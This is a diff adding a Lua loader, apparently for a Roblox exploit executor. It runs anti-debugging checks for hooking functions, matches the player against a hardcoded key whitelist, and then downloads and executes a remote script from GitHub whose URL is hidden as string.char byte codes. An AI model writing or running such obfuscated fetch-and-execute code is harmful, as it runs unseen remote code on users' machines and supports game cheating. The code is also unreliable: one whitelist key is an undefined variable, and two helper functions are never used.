@@ -1,0 +1,154 @@
+-- 此白名单神青制作
+--[by 神青]
+local function SecureHash(input)
+    local salt = "7a3b1f8c9d2e5g4h6i0j"
+    local hash = 0
+    for i = 1, #input do
+        local c = input:sub(i,i)
+        hash = (hash * 31 + c:byte() + salt:sub((i % #salt)+1, (i % #salt)+1):byte()) % 2^32
+    end
+    return tostring(hash)
+end
+
+local function ValidateEnvironment()
+    local checks = {
+        debug = debug and debug.getinfo and not debug.getinfo(1, "S").short_src:find("@"),
+        metatable = getmetatable and getmetatable(loadstring) ~= nil,
+        hooks = (hookfunction or detour_function or replaceclosure or hookfunc or hookmetamethod) ~= nil,
+        fake_objects = typeof(game) ~= "Instance" or typeof(game.GetService) ~= "function",
+        memory = pcall(function() return tostring(collectgarbage("count")):match("%d+") end),
+        hidden_hooks = (debug.getregistry and #debug.getregistry() > 5000) or false,
+        injected = (getconnections and #getconnections(game:GetService("ScriptContext").Error) > 0) or false,
+        fake_env = (getfenv and type(getfenv(2)) ~= "table") or false
+    }
+    
+    for check, result in pairs(checks) do
+        if result then return false, "Environment check failed: "..check end
+    end
+    
+    if newcclosure and type(newcclosure) == "function" then
+        local test = newcclosure(function() end)
+        if debug.info(test, "s") ~= "[C]" then
+            return false, "CClosure hook detected"
+        end
+    end
+    
+    if setreadonly and type(setreadonly) == "function" then
+        local t = {}
+        setreadonly(t, true)
+        if not pcall(function() t[1] = 1 end) then
+            setreadonly(t, false)
+            t[1] = 1
+            if t[1] ~= 1 then
+                return false, "Memory protection tampering detected"
+            end
+        end
+    end
+    
+    return true
+end
+
+local function SecureFetch(url)
+    local success, response = pcall(function()
+        local chunks = {}
+        local chunk_size = 1024
+        local total_size = 0
+        
+        for i = 1, math.random(3,5) do
+            local req = game:HttpGetAsync(url, true, {
+                ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+                ["X-Secure-ID"] = SecureHash(tostring(math.random(1,1000000))),
+                ["Range"] = string.format("bytes=%d-%d", total_size, total_size + chunk_size - 1)
+            })
+            
+            if #req > 0 then
+                table.insert(chunks, req)
+                total_size = total_size + #req
+            end
+        end
+        
+        return table.concat(chunks)
+    end)
+    
+    if not success or not response then
+        return nil
+    end
+    
+    if #response < 100 or response:match("^<!DOCTYPE html>") then
+        return nil
+    end
+    
+    return response
+end
+
+local function AntiTamperExecute(code)
+    local env = {}
+    local protected_env = setmetatable({}, {
+        __index = function(t, k)
+            if k == "require" or k == "loadstring" or k == "load" or k == "getfenv" or k == "setfenv" then
+                error("Restricted function call")
+            end
+            return env[k] or _G[k]
+        end,
+        __newindex = function(t, k, v)
+            if k == "_G" or k == "shared" or k == "getfenv" or k == "setmetatable" then
+                error("Restricted assignment")
+            end
+            env[k] = v
+        end
+    })
+    
+    local fn, err = loadstring(code)
+    if not fn then return false, err end
+    
+    setfenv(fn, protected_env)
+    local success, result = pcall(fn)
+    if not success then return false, result end
+    
+    return true, result
+end
+
+-- 环境验证
+local envValid, envError = ValidateEnvironment()
+if not envValid then
+    warn("[Security] Execution environment invalid: "..tostring(envError))
+    return
+end
+
+-- 白名单数据（您需要修改这里的用户ID和密钥）
+local whitelist = {
+    [7266427695] = "Key",
+    -- 在这里添加您的用户ID和密钥
+    -- 格式: [您的用户ID] = "您的密钥"
+    [yummyfood585] = "LOLHUB",
+    [987654321] = "AnotherUserKey456"
+}
+
+-- 验证当前用户
+local userId = game:GetService("Players").LocalPlayer.UserId
+local userKey = _G.Key or ""
+
+if type(userId) ~= "number" or type(userKey) ~= "string" then
+    warn("[Security] Invalid credentials format")
+    return
+end
+
+local validKey = whitelist[userId]
+if not validKey or SecureHash(userKey) ~= SecureHash(validKey) then
+    warn("[Security] Authorization failed - User ID: "..tostring(userId))
+    return
+end
+
+-- 授权成功，执行主脚本
+warn("[Security] Authorization successful for user: "..tostring(userId))
+
+-- 执行您提供的脚本
+local success, err = pcall(function()
+    loadstring(game:HttpGet(string.char(
+        0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x72,0x61,0x77,0x2e,0x67,0x69,0x74,0x68,0x75,0x62,0x75,0x73,0x65,0x72,0x63,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2e,0x63,0x6f,0x6d,0x2f,0x75,0x73,0x65,0x65,0x72,0x74,0x37,0x34,0x31,0x2f,0x2d,0x58,0x2d,0x2d,0x2d,0x62,0x79,0x4c,0x4f,0x4c,0x2f,0x72,0x65,0x66,0x73,0x2f,0x68,0x65,0x61,0x64,0x73,0x2f,0x6d,0x61,0x69,0x6e,0x2f,0x4c,0x4f,0x4c,0x2d,0x48,0x55,0x42,0x2d,0x42,0x45,0x53,0x54,0x2d,0x4c,0x41,0x53,0x54,0x2d,0x4b,0x45,0x59,0x2d,0x6c,0x6f,0x6c,0x68,0x75,0x62,0xe6,0x9c,0x80,0xe6,0x96,0xb0,0xe5,0xaf,0x86,0xe9,0x92,0xa5,0xe7,0xb3,0xbb,0xe7,0xbb,0x9f
+    )))()
+end)
+
+if not success then
+    warn("[Security] Main script execution failed: "..tostring(err))
+end
